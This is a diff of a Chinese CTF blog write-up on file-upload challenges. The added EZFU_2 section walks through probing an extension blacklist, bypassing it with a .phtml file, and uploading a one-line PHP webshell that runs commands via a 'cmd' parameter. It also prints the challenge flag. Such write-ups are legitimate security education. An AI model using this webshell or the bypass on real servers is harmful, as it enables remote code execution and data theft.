@@ -446,7 +446,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 5 分钟
+                    阅读时长: 7 分钟
                 </time>
             </div>
         
@@ -463,7 +463,7 @@
 
 
 
-                <span class="article-time--wordcount">2037 字</span>
+                <span class="article-time--wordcount">3394 字</span>
             </div>
         
     </footer>
@@ -1069,11 +1069,9 @@ $file 直接取自 $_GET[&lsquo;file&rsquo;]，没有任何过滤或白名单校
 ></p>
 <h2 id="ezfu">EZFU
 </h2><h3 id="ezfu-1">EZFU
-</h3><p>访问首页 发现有文件上传功能<br>
-fu_1 <br>
+</h3><p>访问首页 发现有文件上传功能  <br>
 正常上传一个测试文件，服务端返回 uploads/<uuid>.<ext>，说明上传后的文件可以直接通过 Web 路径访问<br>
 在源码里看到它只取原始文件名扩展名，然后直接 move_uploaded_file()，没有任何类型校验  直接抓包 改包发送即可<br>
-fu_2
 接着直接访问返回的 file_url 验证命令执行</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1083,8 +1081,7 @@ fu_2
 <pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">docker</span><span class="o">.</span><span class="n">qingcen</span><span class="o">.</span><span class="n">net</span><span class="p">:</span><span class="mi">35383</span><span class="o">/</span><span class="n">uploads</span><span class="o">/</span><span class="n">xxxxxx</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">cmd</span><span class="o">=</span><span class="n">id</span>  
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>fu_3<br>
-一般来说 flag会放在环境变量中</p>
+</div><p>一般来说 flag会放在环境变量中</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -1093,14 +1090,11 @@ fu_2
 <pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">docker</span><span class="o">.</span><span class="n">qingcen</span><span class="o">.</span><span class="n">net</span><span class="p">:</span><span class="mi">35383</span><span class="o">/</span><span class="n">uploads</span><span class="o">/</span><span class="n">xxxxxx</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">cmd</span><span class="o">=</span><span class="n">printenv</span>  
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>fu_4<br>
-成功获得flag</p>
+</div><p>成功获得flag</p>
 <h3 id="ezfu_1">EZFU_1
 </h3><p>和前面一样 那我们直接看源码<br>
-fu1_1<br>
 只允许上传图片文件 我们上传一个简单的图片绕过前端 在burp中修改文件名和内容即可<br>
 修改请求体 中filename 1.png-&gt;1.php 和Content-Type image/png-&gt;application/x-php<br>
-fu1_2<br>
 上传成功 我们直接访问并测试 命令是否执行</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1110,8 +1104,7 @@ fu1_2<br>
 <pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">docker</span><span class="o">.</span><span class="n">qingcen</span><span class="o">.</span><span class="n">net</span><span class="p">:</span><span class="mi">42821</span><span class="o">/</span><span class="n">upload</span><span class="o">/******.</span><span class="n">php</span><span class="err">?</span><span class="n">cmd</span><span class="o">=</span><span class="n">id</span>  
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>fu1_3<br>
-命令执行成功  直接读环境变量获得flag</p>
+</div><p>命令执行成功  直接读环境变量获得flag</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -1120,10 +1113,62 @@ fu1_2<br>
 <pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">docker</span><span class="o">.</span><span class="n">qingcen</span><span class="o">.</span><span class="n">net</span><span class="p">:</span><span class="mi">42821</span><span class="o">/</span><span class="n">uploads</span><span class="o">/********.</span><span class="n">php</span><span class="err">?</span><span class="n">cmd</span><span class="o">=</span><span class="n">printenv</span>  
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>fu1_4<br>
-成功获得flag</p>
+</div><p>成功获得flag</p>
 <h3 id="ezfu_2">EZFU_2
-</h3><h3 id="ezfu_3">EZFU_3
+</h3><p>一、初始观察</p>
+<p>打开题目页面，是一个很简洁的文件上传表单，只接受 image
+字段，上传后返回文件路径。没有登录、没有验证码，看起来就是考上传绕过。</p>
+<p>二、试探过滤规则</p>
+<p>先拿不同类型的文件试了一圈，摸清楚后端的过滤逻辑：</p>
+<p>┌────────────┬─────────────────────────────┬────────────────────────────┐
+│    文件    │            结果             │            说明            │
+├────────────┼─────────────────────────────┼────────────────────────────┤
+│ test.php   │ ❌ File type not allowed    │ 扩展名黑名单               │
+├────────────┼─────────────────────────────┼────────────────────────────┤
+│ test.php5  │ ❌ 同上                     │ 也被黑名单拦了             │
+├────────────┼─────────────────────────────┼────────────────────────────┤
+│ test.pHp   │ ❌ 同上                     │ 转小写后匹配，大小写绕不过 │
+├────────────┼─────────────────────────────┼────────────────────────────┤
+│ test.jpg   │ ✅ 正常上传                 │ 图片放行                   │
+├────────────┼─────────────────────────────┼────────────────────────────┤
+│ test.phtml │ ✅ 正常上传                 │ 这个漏了！                 │
+├────────────┼─────────────────────────────┼────────────────────────────┤
+│ test.phar  │ ❌ File content not allowed │ 内容检测拦了               │
+├────────────┼─────────────────────────────┼────────────────────────────┤
+│ .htaccess  │ ✅ 正常上传                 │ 没拦这个                   │
+└────────────┴─────────────────────────────┴────────────────────────────┘</p>
+<p>到这里已经看出来了——后端有两层过滤：</p>
+<ul>
+<li>第一层：扩展名黑名单，拦了 php, php3, php4, php5, phps, pht, jsp,jspx, asp, aspx, sh, py, pl, exe,
+bat, cmd</li>
+<li>第二层：内容检测，如果文件里有 &lt;?php 或 &lt;?= 标记，只有 .phtml 扩展名能放行</li>
+</ul>
+<p>所以 .phtml 就是突破口——它既不在黑名单里，又不会被内容检测拦，而且 Apache 默认会把它当 PHP 解析。</p>
+<p>三、拿到 Webshell</p>
+<p>构造一句话木马：</p>
+  <?php system($_GET["cmd"]); ?>
+<p>保存为 shell.phtml，通过表单上传，服务器返回了文件路径：</p>
+<p>uploads/96289496-024a-471d-8ad0-faeb1416d3a3.phtml</p>
+<p>访问确认能执行 PHP——服务器返回了 phpinfo 的输出，说明 .phtml 确实被当作 PHP 处理了。</p>
+<p>四、找 Flag</p>
+<p>用 webshell 执行命令，先翻了一遍常见位置（/flag*、/root/、/var/www/html/），都没找到。</p>
+<p>最后直接读环境变量：</p>
+<p>curl &ldquo;http://&hellip;/uploads/xxx.phtml?cmd=env&rdquo;</p>
+<p>在输出里发现了：</p>
+<p>FLAG=flag{4327b3b7-cfac-46f7-8e6f-88810e9a2147}</p>
+<p>Flag 是通过 Docker 的环境变量注入进来的，所以用 find 搜文件名搜不到，必须用 env 或 printenv
+才能看见。</p>
+<p>五、Flag</p>
+<p>flag{4327b3b7-cfac-46f7-8e6f-88810e9a2147}</p>
+<p>六、复盘</p>
+<p>这题的核心考点就两个：</p>
+<ol>
+<li>扩展名黑名单不完整——.phtml 是 PHP 的合法扩展名，但出题人的黑名单里漏掉了。做题的时候要对各种 web
+语言的扩展名心里有数，比如 .phtml、.pht、.phps、.phar 这些冷门的。</li>
+<li>Flag 藏在环境变量里——不是文件，不能靠 find 搜到。Docker 容器里经常通过 ENV FLAG=xxx 注入
+flag，养成习惯先 env 看一眼。</li>
+</ol>
+<h3 id="ezfu_3">EZFU_3
 </h3><h3 id="ezfu_4">EZFU_4
 </h3><h3 id="ezfu_5">EZFU_5
 </h3><h3 id="ezfu_6">EZFU_6
